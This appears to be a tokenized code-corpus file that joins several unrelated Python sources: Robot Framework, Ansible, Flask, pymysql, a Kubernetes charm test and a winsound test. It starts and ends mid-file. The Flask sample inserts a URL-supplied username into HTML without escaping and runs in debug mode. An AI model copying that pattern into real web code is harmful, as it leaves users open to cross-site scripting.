▁ arguments ▁ %s ▁ " "(version ▁ %s, ▁ %s ▁ type, ▁ %s ▁ scope, ▁ %d ▁ keywords%s)" % ( name , seq2str2 ( args ) , lib . version or '<unknown>' , type , lib . scope , len ( lib ) , listener ) ) <newline> if not lib and not lib . has_listener : <newline> <indent> LOGGER . warn ( "Imported ▁ library ▁'%s' ▁ contains ▁ no ▁ keywords." % name ) <newline> <dedent> <dedent> def _copy_library ( self , orig , name ) : <newline>  # ▁ This ▁ is ▁ pretty ▁ ugly. ▁ Hopefully ▁ we ▁ can ▁ remove ▁ cache ▁ and ▁ copying <encdom>  # ▁ altogether ▁ in ▁ 3.0 ▁ and ▁ always ▁ just ▁ re-import ▁ libraries: <encdom>  # ▁ https://github.com/robotframework/robotframework/issues/2106 <encdom>  # ▁ Could ▁ then ▁ also ▁ remove ▁ __copy__ ▁ methods ▁ added ▁ to ▁ some ▁ handlers ▁ as <encdom>  # ▁ a ▁ workaround ▁ for ▁ this ▁ IronPython ▁ bug: <encdom>  # ▁ https://github.com/IronLanguages/main/issues/1192 <encdom> <indent> lib = copy . copy ( orig ) <newline> lib . name = name <newline> lib . scope = type ( lib . scope ) ( lib ) <newline> lib . reset_instance ( ) <newline> lib . handlers = HandlerStore ( orig . handlers . source , orig . handlers . source_type ) <newline> for handler in orig . handlers . _normal . values ( ) : <newline> <indent> handler = copy . copy ( handler ) <newline> handler . library = lib <newline> lib . handlers . add ( handler ) <newline> <dedent> for handler in orig . handlers . _embedded : <newline> <indent> handler = copy . copy ( handler ) <newline> handler . library = lib <newline> lib . handlers . add ( handler , embedded = True ) <newline> <dedent> return lib <newline> <dedent> <dedent> class ImportCache ( object ) : <newline> <indent>  """ Keeps ▁ track ▁ on ▁ and ▁ optionally ▁ caches ▁ imported ▁ items. <strnewline> <strnewline> ▁ Handles ▁ paths ▁ in ▁ keys ▁ case-insensitively ▁ on ▁ case-insensitive ▁ OSes. <strnewline> ▁ Unlike ▁ dicts, ▁ this ▁ storage ▁ accepts ▁ mutable ▁ values ▁ in ▁ keys. <strnewline> ▁ """  <newline> def __init__ ( self ) : <newline> <indent> self . _keys = [ ] <newline> self . _items = [ ] <newline> <dedent> def __setitem__ ( self , key , item ) : <newline> <indent> if not is_string ( key ) and not isinstance ( key , tuple ) : <newline> <indent> raise FrameworkError ( 'Invalid ▁ key ▁ for ▁ ImportCache' ) <newline> <dedent> key = self . _norm_path_key ( key ) <newline> if key not in self . _keys : <newline> <indent> self . _keys . append ( key ) <newline> self . _items . append ( item ) <newline> <dedent> else : <newline> <indent> self . _items [ self . _keys . index ( key ) ] = item <newline> <dedent> <dedent> def add ( self , key , item = None ) : <newline> <indent> self . __setitem__ ( key , item ) <newline> <dedent> def __getitem__ ( self , key ) : <newline> <indent> key = self . _norm_path_key ( key ) <newline> if key not in self . _keys : <newline> <indent> raise KeyError <newline> <dedent> return self . _items [ self . _keys . index ( key ) ] <newline> <dedent> def __contains__ ( self , key ) : <newline> <indent> return self . _norm_path_key ( key ) in self . _keys <newline> <dedent> def values ( self ) : <newline> <indent> return self . _items <newline> <dedent> def _norm_path_key ( self , key ) : <newline> <indent> if self . _is_path ( key ) : <newline> <indent> return normpath ( key , case_normalize = True ) <newline> <dedent> if isinstance ( key , tuple ) : <newline> <indent> return tuple ( self . _norm_path_key ( k ) for k in key ) <newline> <dedent> return key <newline> <dedent> def _is_path ( self , key ) : <newline> <indent> return is_string ( key ) and os . path . isabs ( key ) and os . path . exists ( key ) <newline> <dedent> <dedent>
 # ▁ Copyright ▁ (c) ▁ Microsoft ▁ Corporation. ▁ All ▁ rights ▁ reserved. <encdom>  # ▁ Licensed ▁ under ▁ the ▁ MIT ▁ License. ▁ See ▁ License.txt ▁ in ▁ the ▁ project ▁ root ▁ for ▁ license ▁ information. <encdom> import azure . cli . command_modules . taskhelp . _help  # ▁ pylint: ▁ disable=unused-import <encdom> <newline> def load_params ( _ ) : <newline> <indent> pass <newline> <dedent> def load_commands ( ) : <newline> <indent> import azure . cli . command_modules . taskhelp . commands  # ▁ pylint: ▁ disable=redefined-outer-name, ▁ unused-variable <encdom> <newline> <dedent>
 # ▁ Copyright ▁ 2015 ▁ Peter ▁ Sprygada ▁ <psprygada@ansible.com> <encdom>  # ▁ This ▁ file ▁ is ▁ part ▁ of ▁ Ansible <encdom>  # ▁ Ansible ▁ is ▁ free ▁ software: ▁ you ▁ can ▁ redistribute ▁ it ▁ and/or ▁ modify <encdom>  # ▁ it ▁ under ▁ the ▁ terms ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License ▁ as ▁ published ▁ by <encdom>  # ▁ the ▁ Free ▁ Software ▁ Foundation, ▁ either ▁ version ▁ 3 ▁ of ▁ the ▁ License, ▁ or <encdom>  # ▁ (at ▁ your ▁ option) ▁ any ▁ later ▁ version. <encdom>  # ▁ Ansible ▁ is ▁ distributed ▁ in ▁ the ▁ hope ▁ that ▁ it ▁ will ▁ be ▁ useful, <encdom>  # ▁ but ▁ WITHOUT ▁ ANY ▁ WARRANTY; ▁ without ▁ even ▁ the ▁ implied ▁ warranty ▁ of <encdom>  # ▁ MERCHANTABILITY ▁ or ▁ FITNESS ▁ FOR ▁ A ▁ PARTICULAR ▁ PURPOSE. ▁ See ▁ the <encdom>  # ▁ GNU ▁ General ▁ Public ▁ License ▁ for ▁ more ▁ details. <encdom>  # ▁ You ▁ should ▁ have ▁ received ▁ a ▁ copy ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License <encdom>  # ▁ along ▁ with ▁ Ansible. ▁ If ▁ not, ▁ see ▁ <http://www.gnu.org/licenses/>. <encdom> from __future__ import ( absolute_import , division , print_function ) <newline> __metaclass__ = type <newline> import os <newline> import re <newline> import time <newline> import glob <newline> from ansible . plugins . action . eos import ActionModule as _ActionModule <newline> from ansible . module_utils . _text import to_text <newline> from ansible . module_utils . six . moves . urllib . parse import urlsplit <newline> from ansible . utils . vars import merge_hash <newline> PRIVATE_KEYS_RE = re . compile ( '__.+__' ) <newline> class ActionModule ( _ActionModule ) : <newline> <indent> def run ( self , tmp = None , task_vars = None ) : <newline> <indent> if self . _task . args . get ( 'src' ) : <newline> <indent> try : <newline> <indent> self . _handle_template ( ) <newline> <dedent> except ValueError as exc : <newline> <indent> return dict ( failed = True , msg = exc . message ) <newline> <dedent> <dedent> result = super ( ActionModule , self ) . run ( tmp , task_vars ) <newline> if self . _task . args . get ( 'backup' ) and result . get ( '__backup__' ) : <newline>  # ▁ User ▁ requested ▁ backup ▁ and ▁ no ▁ error ▁ occurred ▁ in ▁ module. <encdom>  # ▁ NOTE: ▁ If ▁ there ▁ is ▁ a ▁ parameter ▁ error, ▁ _backup ▁ key ▁ may ▁ not ▁ be ▁ in ▁ results. <encdom> <indent> filepath = self . _write_backup ( task_vars [ 'inventory_hostname' ] , result [ '__backup__' ] ) <newline> result [ 'backup_path' ] = filepath <newline>  # ▁ strip ▁ out ▁ any ▁ keys ▁ that ▁ have ▁ two ▁ leading ▁ and ▁ two ▁ trailing <encdom>  # ▁ underscore ▁ characters <encdom> <dedent> for key in result . keys ( ) : <newline> <indent> if PRIVATE_KEYS_RE . match ( key ) : <newline> <indent> del result [ key ] <newline> <dedent> <dedent> return result <newline> <dedent> def _get_working_path ( self ) : <newline> <indent> cwd = self . _loader . get_basedir ( ) <newline> if self . _task . _role is not None : <newline> <indent> cwd = self . _task . _role . _role_path <newline> <dedent> return cwd <newline> <dedent> def _write_backup ( self , host , contents ) : <newline> <indent> backup_path = self . _get_working_path ( ) + '/backup' <newline> if not os . path . exists ( backup_path ) : <newline> <indent> os . mkdir ( backup_path ) <newline> <dedent> for fn in glob . glob ( '%s/%s*' % ( backup_path , host ) ) : <newline> <indent> os . remove ( fn ) <newline> <dedent> tstamp = time . strftime ( "%Y-%m-%d@%H:%M:%S" , time . localtime ( time . time ( ) ) ) <newline> filename = '%s/%s_config.%s' % ( backup_path , host , tstamp ) <newline> open ( filename , 'w' ) . write ( contents ) <newline> return filename <newline> <dedent> def _handle_template ( self ) : <newline> <indent> src = self . _task . args . get ( 'src' ) <newline> working_path = self . _get_working_path ( ) <newline> if os . path . isabs ( src ) or urlsplit ( 'src' ) . scheme : <newline> <indent> source = src <newline> <dedent> else : <newline> <indent> source = self . _loader . path_dwim_relative ( working_path , 'templates' , src ) <newline> if not source : <newline> <indent> source = self . _loader . path_dwim_relative ( working_path , src ) <newline> <dedent> <dedent> if not os . path . exists ( source ) : <newline> <indent> raise ValueError ( 'path ▁ specified ▁ in ▁ src ▁ not ▁ found' ) <newline> <dedent> try : <newline> <indent> with open ( source , 'r' ) as f : <newline> <indent> template_data = to_text ( f . read ( ) ) <newline> <dedent> <dedent> except IOError : <newline> <indent> return dict ( failed = True , msg = 'unable ▁ to ▁ load ▁ src ▁ file' ) <newline>  # ▁ Create ▁ a ▁ template ▁ search ▁ path ▁ in ▁ the ▁ following ▁ order: <encdom>  # ▁ [working_path, ▁ self_role_path, ▁ dependent_role_paths, ▁ dirname(source)] <encdom> <dedent> searchpath = [ working_path ] <newline> if self . _task . _role is not None : <newline> <indent> searchpath . append ( self . _task . _role . _role_path ) <newline> if hasattr ( self . _task , "_block:" ) : <newline> <indent> dep_chain = self . _task . _block . get_dep_chain ( ) <newline> if dep_chain is not None : <newline> <indent> for role in dep_chain : <newline> <indent> searchpath . append ( role . _role_path ) <newline> <dedent> <dedent> <dedent> <dedent> searchpath . append ( os . path . dirname ( source ) ) <newline> self . _templar . environment . loader . searchpath = searchpath <newline> self . _task . args [ 'src' ] = self . _templar . template ( template_data ) <newline> <dedent> <dedent>
from flask import Flask <newline>  # ▁ print ▁ a ▁ nice ▁ greeting. <encdom> def say_hello ( username = "World" ) : <newline> <indent> return '<p>Hello ▁ %s!</p> \n ' % username <newline>  # ▁ some ▁ bits ▁ of ▁ text ▁ for ▁ the ▁ page. <encdom> <dedent> header_text =  ''' <strnewline> ▁ ▁ ▁ ▁ <html> \n <head> ▁ <title>EB ▁ Flask ▁ Test</title> ▁ </head> \n <body> '''  <newline> instructions =  ''' <strnewline> ▁ ▁ ▁ ▁ <p><em>Hint</em>: ▁ This ▁ is ▁ a ▁ RESTful ▁ web ▁ service! ▁ Append ▁ a ▁ username <strnewline> ▁ ▁ ▁ ▁ to ▁ the ▁ URL ▁ (for ▁ example: ▁ <code>/Thelonious</code>) ▁ to ▁ say ▁ hello ▁ to <strnewline> ▁ ▁ ▁ ▁ someone ▁ specific.</p> \n '''  <newline> home_link = '<p><a ▁ href="/">Back</a></p> \n ' <newline> footer_text = '</body> \n </html>' <newline>  # ▁ EB ▁ looks ▁ for ▁ an ▁'application' ▁ callable ▁ by ▁ default. <encdom> application = Flask ( __name__ ) <newline>  # ▁ add ▁ a ▁ rule ▁ for ▁ the ▁ index ▁ page. <encdom> application . add_url_rule ( '/' , 'index' , ( lambda : header_text + say_hello ( ) + instructions + footer_text ) ) <newline>  # ▁ add ▁ a ▁ rule ▁ when ▁ the ▁ page ▁ is ▁ accessed ▁ with ▁ a ▁ name ▁ appended ▁ to ▁ the ▁ site <encdom>  # ▁ URL. <encdom> application . add_url_rule ( '/<username>' , 'hello' , ( lambda username : header_text + say_hello ( username ) + home_link + footer_text ) ) <newline>  # ▁ run ▁ the ▁ app. <encdom> if __name__ == "__main__" : <newline>  # ▁ Setting ▁ debug ▁ to ▁ True ▁ enables ▁ debug ▁ output. ▁ This ▁ line ▁ should ▁ be <encdom>  # ▁ removed ▁ before ▁ deploying ▁ a ▁ production ▁ app. <encdom> <indent> application . debug = True <newline> application . run ( ) <newline> <dedent>
 # ▁ Sorted ▁ by ▁ alphabetical ▁ order <encdom> from pymysql . tests . test_DictCursor import * <newline> from pymysql . tests . test_SSCursor import * <newline> from pymysql . tests . test_basic import * <newline> from pymysql . tests . test_connection import * <newline> from pymysql . tests . test_converters import * <newline> from pymysql . tests . test_cursor import * <newline> from pymysql . tests . test_err import * <newline> from pymysql . tests . test_issues import * <newline> from pymysql . tests . test_load_local import * <newline> from pymysql . tests . test_nextset import * <newline> from pymysql . tests . test_optionfile import * <newline> from pymysql . tests . thirdparty import * <newline> if __name__ == "__main__" : <newline> <indent> import unittest2 <newline> unittest2 . main ( ) <newline> <dedent>
 # !/usr/bin/env ▁ python <encdom>  # ▁ Copyright ▁ 2015 ▁ The ▁ Kubernetes ▁ Authors ▁ All ▁ rights ▁ reserved. <encdom>  # ▁ Licensed ▁ under ▁ the ▁ Apache ▁ License, ▁ Version ▁ 2.0 ▁ (the ▁"License"); <encdom>  # ▁ you ▁ may ▁ not ▁ use ▁ this ▁ file ▁ except ▁ in ▁ compliance ▁ with ▁ the ▁ License. <encdom>  # ▁ You ▁ may ▁ obtain ▁ a ▁ copy ▁ of ▁ the ▁ License ▁ at <encdom>  # ▁ http://www.apache.org/licenses/LICENSE-2.0 <encdom>  # ▁ Unless ▁ required ▁ by ▁ applicable ▁ law ▁ or ▁ agreed ▁ to ▁ in ▁ writing, ▁ software <encdom>  # ▁ distributed ▁ under ▁ the ▁ License ▁ is ▁ distributed ▁ on ▁ an ▁"AS ▁ IS" ▁ BASIS, <encdom>  # ▁ WITHOUT ▁ WARRANTIES ▁ OR ▁ CONDITIONS ▁ OF ▁ ANY ▁ KIND, ▁ either ▁ express ▁ or ▁ implied. <encdom>  # ▁ See ▁ the ▁ License ▁ for ▁ the ▁ specific ▁ language ▁ governing ▁ permissions ▁ and <encdom>  # ▁ limitations ▁ under ▁ the ▁ License. <encdom> from mock import patch , Mock , MagicMock <newline> from path import Path <newline> import pytest <newline> import sys <newline>  # ▁ Munge ▁ the ▁ python ▁ path ▁ so ▁ we ▁ can ▁ find ▁ our ▁ hook ▁ code <encdom> d = Path ( '__file__' ) . parent . abspath ( ) / 'hooks' <newline> sys . path . insert ( 0 , d . abspath ( ) ) <newline>  # ▁ Import ▁ the ▁ modules ▁ from ▁ the ▁ hook <encdom> import install <newline> class TestInstallHook ( ) : <newline> <indent> @ patch ( 'install.path' ) <newline> def test_update_rc_files ( self , pmock ) : <newline> <indent>  """ <strnewline> ▁ Test ▁ happy ▁ path ▁ on ▁ updating ▁ env ▁ files. ▁ Assuming ▁ everything <strnewline> ▁ exists ▁ and ▁ is ▁ in ▁ place. <strnewline> ▁ """  <newline> pmock . return_value . lines . return_value = [ 'line1' , 'line2' ] <newline> install . update_rc_files ( [ 'test1' , 'test2' ] ) <newline> pmock . return_value . write_lines . assert_called_with ( [ 'line1' , 'line2' , 'test1' , 'test2' ] ) <newline> <dedent> def test_update_rc_files_with_nonexistant_path ( self ) : <newline> <indent>  """ <strnewline> ▁ Test ▁ an ▁ unhappy ▁ path ▁ if ▁ the ▁ bashrc/users ▁ do ▁ not ▁ exist. <strnewline> ▁ """  <newline> with pytest . raises ( OSError ) as exinfo : <newline> <indent> install . update_rc_files ( [ 'test1' , 'test2' ] ) <newline> <dedent> <dedent> @ patch ( 'install.fetch' ) <newline> @ patch ( 'install.hookenv' ) <newline> def test_package_installation ( self , hemock , ftmock ) : <newline> <indent>  """ <strnewline> ▁ Verify ▁ we ▁ are ▁ calling ▁ the ▁ known ▁ essentials ▁ to ▁ build ▁ and ▁ syndicate <strnewline> ▁ kubes. <strnewline> ▁ """  <newline> pkgs = [ 'build-essential' , 'git' , 'make' , 'nginx' , 'python-pip' ] <newline> install . install_packages ( ) <newline> hemock . log . assert_called_with ( 'Installing ▁ Debian ▁ packages' ) <newline> ftmock . filter_installed_packages . assert_called_with ( pkgs ) <newline> <dedent> @ patch ( 'install.archiveurl.ArchiveUrlFetchHandler' ) <newline> def test_go_download ( self , aumock ) : <newline> <indent>  """ <strnewline> ▁ Test ▁ that ▁ we ▁ are ▁ actually ▁ handing ▁ off ▁ to ▁ charm-helpers ▁ to <strnewline> ▁ download ▁ a ▁ specific ▁ archive ▁ of ▁ Go. ▁ This ▁ is ▁ non-configurable ▁ so <strnewline> ▁ its ▁ reasonably ▁ safe ▁ to ▁ assume ▁ we're ▁ going ▁ to ▁ always ▁ do ▁ this, <strnewline> ▁ and ▁ when ▁ it ▁ changes ▁ we ▁ shall ▁ curse ▁ the ▁ brittleness ▁ of ▁ this ▁ test. <strnewline> ▁ """  <newline> ins_mock = aumock . return_value . install <newline> install . download_go ( ) <newline> url = 'https://storage.googleapis.com/golang/go1.4.2.linux-amd64.tar.gz' <newline> sha1 = '5020af94b52b65cc9b6f11d50a67e4bae07b0aff' <newline> ins_mock . assert_called_with ( url , '/usr/local' , sha1 , 'sha1' ) <newline> <dedent> @ patch ( 'install.subprocess' ) <newline> def test_clone_repository ( self , spmock ) : <newline> <indent>  """ <strnewline> ▁ We're ▁ not ▁ using ▁ a ▁ unit-tested ▁ git ▁ library ▁ - ▁ so ▁ ensure ▁ our ▁ subprocess <strnewline> ▁ call ▁ is ▁ consistent. ▁ If ▁ we ▁ change ▁ this, ▁ we ▁ want ▁ to ▁ know ▁ we've ▁ broken ▁ it. <strnewline> ▁ """  <newline> install . clone_repository ( ) <newline> repo = 'https://github.com/GoogleCloudPlatform/kubernetes.git' <newline> direct = '/opt/kubernetes' <newline> spmock . check_output . assert_called_with ( [ 'git' , 'clone' , repo , direct ] ) <newline> <dedent> @ patch ( 'install.install_packages' ) <newline> @ patch ( 'install.download_go' ) <newline> @ patch ( 'install.clone_repository' ) <newline> @ patch ( 'install.update_rc_files' ) <newline> @ patch ( 'install.hookenv' ) <newline> def test_install_main ( self , hemock , urmock , crmock , dgmock , ipmock ) : <newline> <indent>  """ <strnewline> ▁ Ensure ▁ the ▁ driver/main ▁ method ▁ is ▁ calling ▁ all ▁ the ▁ supporting ▁ methods. <strnewline> ▁ """  <newline> strings = [ 'export ▁ GOROOT=/usr/local/go \n ' , 'export ▁ PATH=$PATH:$GOROOT/bin \n ' , 'export ▁ KUBE_MASTER_IP=0.0.0.0 \n ' , 'export ▁ KUBERNETES_MASTER=http://$KUBE_MASTER_IP \n ' , ] <newline> install . install ( ) <newline> crmock . assert_called_once ( ) <newline> dgmock . assert_called_once ( ) <newline> crmock . assert_called_once ( ) <newline> urmock . assert_called_with ( strings ) <newline> hemock . open_port . assert_called_with ( 8080 ) <newline> <dedent> <dedent>
 # ▁ Copyright ▁ 2015 ▁ The ▁ TensorFlow ▁ Authors. ▁ All ▁ Rights ▁ Reserved. <encdom>  # ▁ Licensed ▁ under ▁ the ▁ Apache ▁ License, ▁ Version ▁ 2.0 ▁ (the ▁"License"); <encdom>  # ▁ you ▁ may ▁ not ▁ use ▁ this ▁ file ▁ except ▁ in ▁ compliance ▁ with ▁ the ▁ License. <encdom>  # ▁ You ▁ may ▁ obtain ▁ a ▁ copy ▁ of ▁ the ▁ License ▁ at <encdom>  # ▁ http://www.apache.org/licenses/LICENSE-2.0 <encdom>  # ▁ Unless ▁ required ▁ by ▁ applicable ▁ law ▁ or ▁ agreed ▁ to ▁ in ▁ writing, ▁ software <encdom>  # ▁ distributed ▁ under ▁ the ▁ License ▁ is ▁ distributed ▁ on ▁ an ▁"AS ▁ IS" ▁ BASIS, <encdom>  # ▁ WITHOUT ▁ WARRANTIES ▁ OR ▁ CONDITIONS ▁ OF ▁ ANY ▁ KIND, ▁ either ▁ express ▁ or ▁ implied. <encdom>  # ▁ See ▁ the ▁ License ▁ for ▁ the ▁ specific ▁ language ▁ governing ▁ permissions ▁ and <encdom>  # ▁ limitations ▁ under ▁ the ▁ License. <encdom>  """ Extension ▁ to ▁ unittest ▁ to ▁ run ▁ parameterized ▁ tests. """  <newline> from __future__ import absolute_import <newline> from __future__ import division <newline> from __future__ import print_function <newline> raise ImportError ( "Not ▁ implemented ▁ yet." ) <newline>
import bench <newline> from _collections import namedtuple <newline> T = namedtuple ( "Tup" , [ "foo1" , "foo2" , "foo3" , "foo4" , "num" ] ) <newline> def test ( num ) : <newline> <indent> t = T ( 0 , 0 , 0 , 0 , 20000000 ) <newline> i = 0 <newline> while i < t . num : <newline> <indent> i += 1 <newline> <dedent> <dedent> bench . run ( test ) <newline>
import unittest <newline> from yowsup . structs import ProtocolTreeNode <newline> from yowsup . layers . coder . encoder import WriteEncoder <newline> from yowsup . layers . coder . tokendictionary import TokenDictionary <newline> class EncoderTest ( unittest . TestCase ) : <newline> <indent> def setUp ( self ) : <newline> <indent> self . res = [ ] <newline> self . encoder = WriteEncoder ( TokenDictionary ( ) ) <newline> <dedent> def test_encode ( self ) : <newline> <indent> node = ProtocolTreeNode ( "message" , { "form" : "abc" , "to" : "xyz" } , [ ProtocolTreeNode ( "media" , { "width" : "123" } , data = "123456" ) ] ) <newline> result = self . encoder . protocolTreeNodeToBytes ( node ) <newline> self . assertTrue ( result in ( [ 248 , 6 , 89 , 252 , 4 , 102 , 111 , 114 , 109 , 252 , 3 , 97 , 98 , 99 , 165 , 252 , 3 , 120 , 121 , 122 , 248 , 1 , 248 , 4 , 87 , 236 , 99 , 252 , 3 , 49 , 50 , 51 , 252 , 6 , 49 , 50 , 51 , 52 , 53 , 54 ] , [ 248 , 6 , 89 , 165 , 252 , 3 , 120 , 121 , 122 , 252 , 4 , 102 , 111 , 114 , 109 , 252 , 3 , 97 , 98 , 99 , 248 , 1 , 248 , 4 , 87 , 236 , 99 , 252 , 3 , 49 , 50 , 51 , 252 , 6 , 49 , 50 , 51 , 52 , 53 , 54 ] ) ) <newline> <dedent> <dedent>
__author__ = 'kosci' <newline>
 # ▁ Ridiculously ▁ simple ▁ test ▁ of ▁ the ▁ winsound ▁ module ▁ for ▁ Windows. <encdom> import unittest <newline> from test import test_support <newline> test_support . requires ( 'audio' ) <newline> import time <newline> import os <newline> import subprocess <newline> winsound = test_support . import_module ( 'winsound' ) <newline> ctypes = test_support . import_module ( 'ctypes' ) <newline> import _winreg <newline> def has_sound ( sound ) : <newline> <indent>  """ Find ▁ out ▁ if ▁ a ▁ particular ▁ event ▁ is ▁ configured ▁ with ▁ a ▁ default ▁ sound """  <newline> try : <newline>  # ▁ Ask ▁ the ▁ mixer ▁ API ▁ for ▁ the ▁ number ▁ of ▁ devices ▁ it ▁ knows ▁ about. <encdom>  # ▁ When ▁ there ▁ are ▁ no ▁ devices, ▁ PlaySound ▁ will ▁ fail. <encdom> <indent> if ctypes . windll . winmm . mixerGetNumDevs ( ) is 0 : <newline> <indent> return False <newline> <dedent> key = _winreg . OpenKeyEx ( _winreg . HKEY_CURRENT_USER , "AppEvents\Schemes\Apps\.Default\{0}\.Default" . format ( sound ) ) <newline> value = _winreg . EnumValue ( key , 0 ) [ 1 ] <newline> if value is not u"" : <newline> <indent> return True <newline> <dedent> else : <newline> <indent> return False <newline> <dedent> <dedent> except WindowsError : <newline> <indent> return False <newline> <dedent> <dedent> class BeepTest ( unittest . TestCase ) : <newline>  # ▁ As ▁ with ▁ PlaySoundTest, ▁ incorporate ▁ the ▁ _have_soundcard() ▁ check <encdom>  # ▁ into ▁ our ▁ test ▁ methods. ▁ If ▁ there's ▁ no ▁ audio ▁ device ▁ present, <encdom>  # ▁ winsound.Beep ▁ returns ▁ 0 ▁ and ▁ GetLastError() ▁ returns ▁ 127, ▁ which <encdom>  # ▁ is: ▁ ERROR_PROC_NOT_FOUND ▁ ("The ▁ specified ▁ procedure ▁ could ▁ not <encdom>  # ▁ be ▁ found"). ▁ (FWIW, ▁ virtual/Hyper-V ▁ systems ▁ fall ▁ under ▁ this <encdom>  # ▁ scenario ▁ as ▁ they ▁ have ▁ no ▁ sound ▁ devices ▁ whatsoever ▁ (not ▁ even <encdom>  # ▁ a ▁ legacy ▁ Beep ▁ device).) <encdom> <indent> def test_errors ( self ) : <newline> <indent> self . assertRaises ( TypeError , winsound . Beep ) <newline> self . assertRaises ( ValueError , winsound . Beep , 36 , 75 ) <newline> self . assertRaises ( ValueError , winsound . Beep , 32768 , 75 ) <newline> <dedent> def test_extremes ( self ) : <newline> <indent> self . _beep ( 37 , 75 ) <newline> self . _beep ( 32767 , 75 ) <newline> <dedent> def test_increasingfrequency ( self ) : <newline> <indent> for i in xrange ( 100 , 2000 , 100 ) : <newline> <indent> self . _beep ( i , 75 ) <newline> <dedent> <dedent> def _beep ( self , * args ) : <newline>  # ▁ these ▁ tests ▁ used ▁ to ▁ use ▁ _have_soundcard(), ▁ but ▁ it's ▁ quite <encdom>  # ▁ possible ▁ to ▁ have ▁ a ▁ soundcard, ▁ and ▁ yet ▁ have ▁ the ▁ beep ▁ driver <encdom>  # ▁ disabled. ▁ So ▁ basically, ▁ we ▁ have ▁ no ▁ way ▁ of ▁ knowing ▁ whether <encdom>  # ▁ a ▁ beep ▁ should ▁ be ▁ produced ▁ or ▁ not, ▁ so ▁ currently ▁ if ▁ these <encdom>  # ▁ tests ▁ fail ▁ we're ▁ ignoring ▁ them <encdom>  # ▁ XXX ▁ the ▁ right ▁ fix ▁ for ▁ this ▁ is ▁ to ▁ define ▁ something ▁ like <encdom>  # ▁ _have_enabled_beep_driver() ▁ and ▁ use ▁ that ▁ instead ▁ of ▁ the <encdom>  # ▁ try/except ▁ below <encdom> <indent> try : <newline> <indent> winsound . Beep ( * args ) <newline> <dedent> except RuntimeError : <newline> <indent> pass <newline> <dedent> <dedent> <dedent> class MessageBeepTest ( unittest . TestCase ) : <newline> <indent> def tearDown ( self ) : <newline> <indent> time . sleep ( 0.5 ) <newline> <dedent> def test_default ( self ) : <newline> <indent> self . assertRaises ( TypeError , winsound . MessageBeep , "bad" ) <newline> self . assertRaises ( TypeError , winsound . MessageBeep , 42 , 42 ) <newline> winsound . MessageBeep ( ) <newline> <dedent> def test_ok ( self ) : <newline> <indent> winsound . MessageBeep ( winsound . MB_OK ) <newline> <dedent> def test_asterisk ( self ) : <newline> <indent> winsound . MessageBeep ( winsound . MB_ICONASTERISK ) <newline> <dedent> def test_exclamation ( self ) : <newline> <indent> winsound . MessageBeep ( winsound . MB_ICONEXCLAMATION ) <newline> <dedent> def test_hand ( self ) : <newline> <indent> winsound . MessageBeep ( winsound . MB_ICONHAND ) <newline> <dedent> def test_question ( self ) : <newline> <indent> winsound . MessageBeep ( winsound . MB_ICONQUESTION ) <newline> <dedent> <dedent> class PlaySoundTest ( unittest . TestCase ) : <newline> <indent> def test_errors ( self ) : <newline> <indent> self . assertRaises ( TypeError , winsound . PlaySound ) <newline> self . assertRaises ( TypeError , winsound . PlaySound , "bad" , "bad" ) <newline> self . assertRaises ( RuntimeError , winsound . PlaySound , "none" , winsound . SND_ASYNC | winsound . SND_MEMORY ) <newline> <dedent> @ unittest . skipUnless ( has_sound ( "SystemAsterisk" ) , "No ▁ default ▁ SystemAsterisk" ) <newline> def test_alias_asterisk ( self ) : <newline> <indent> if _have_soundcard ( ) : <newline> <indent> winsound . PlaySound ( 'SystemAsterisk' , winsound . SND_ALIAS ) <newline> <dedent> else : <newline> <indent> self . assertRaises ( RuntimeError , winsound . PlaySound , 'SystemAsterisk' , winsound . SND_ALIAS ) <newline> <dedent> <dedent> @ unittest . skipUnless ( has_sound ( "SystemExclamation" ) , "No ▁ default ▁ SystemExclamation" ) <newline> def test_alias_exclamation ( self ) : <newline> <indent> if _have_soundcard ( ) : <newline> <indent> winsound . PlaySound ( 'SystemExclamation' , winsound . SND_ALIAS ) <newline> <dedent> else : <newline> <indent> self . assertRaises ( RuntimeError , winsound . PlaySound , 'SystemExclamation' , winsound . SND_ALIAS ) <newline> <dedent> <dedent> @ unittest . skipUnless ( has_sound ( "SystemExit" ) , "No ▁ default ▁ SystemExit" ) <newline> def test_alias_exit ( self ) : <newline> <indent> if _have_soundcard ( ) : <newline> <indent> winsound . PlaySound ( 'SystemExit' , winsound . SND_ALIAS ) <newline> <dedent> else : <newline> <indent> self . assertRaises ( RuntimeError , winsound . PlaySound , 'SystemExit' , winsound . SND_ALIAS ) <newline> <dedent> <dedent> @ unittest . skipUnless ( has_sound ( "SystemHand" ) , "No ▁ default ▁ SystemHand" ) <newline> def test_alias_hand ( self ) : <newline> <indent> if _have_soundcard ( ) : <newline> <indent> winsound . PlaySound ( 'SystemHand' , winsound . SND_ALIAS ) <newline> <dedent> else : <newline> <indent> self . assertRaises ( RuntimeError , winsound . PlaySound , 'SystemHand' , winsound . SND_ALIAS ) <newline> <dedent> <dedent> @ unittest . skipUnless ( has_sound ( "SystemQuestion" ) , "No ▁ default ▁ SystemQuestion" ) <newline> def test_alias_question ( self ) : <newline> <indent> if _have_soundcard ( ) : <newline> <indent> winsound . PlaySound ( 'SystemQuestion' , winsound . SND_ALIAS ) <newline> <dedent> else : <newline> <indent> self . assertRaises ( RuntimeError , winsound . PlaySound , 'SystemQuestion' , winsound . SND_ALIAS ) <newline> <dedent> <dedent> def test_alias_fallback ( self ) : <newline>  # ▁ In ▁ the ▁ absense ▁ of ▁ the ▁ ability ▁ to ▁ tell ▁ if ▁ a ▁ sound ▁ was ▁ actually <encdom>  # ▁ played, ▁ this ▁ test ▁ has ▁ two ▁ acceptable ▁ outcomes: ▁ success ▁ (no ▁ error, <encdom>  # ▁ sound ▁ was ▁ theoretically ▁ played; ▁ although ▁ as ▁ issue ▁ # 19987 ▁ shows <encdom>  # ▁ a ▁ box ▁ without ▁ a ▁ soundcard ▁ can ▁"succeed") ▁ or ▁ RuntimeError. ▁ Any <encdom>  # ▁ other ▁ error ▁ is ▁ a ▁ failure. <encdom> <indent> try : <newline> <indent> winsound . PlaySound ( '!"$%&/( # +*' , winsound . SND_ALIAS ) <newline> <dedent> except RuntimeError : <newline> <indent> pass <newline> <dedent> <dedent> def test_alias_nofallback ( self ) : <newline> <indent> if _have_soundcard ( ) : <newline>  # ▁ Note ▁ that ▁ this ▁ is ▁ not ▁ the ▁ same ▁ as ▁ asserting ▁ RuntimeError <encdom>  # ▁ will ▁ get ▁ raised: ▁ you ▁ cannot ▁ convert ▁ this ▁ to <encdom>  # ▁ 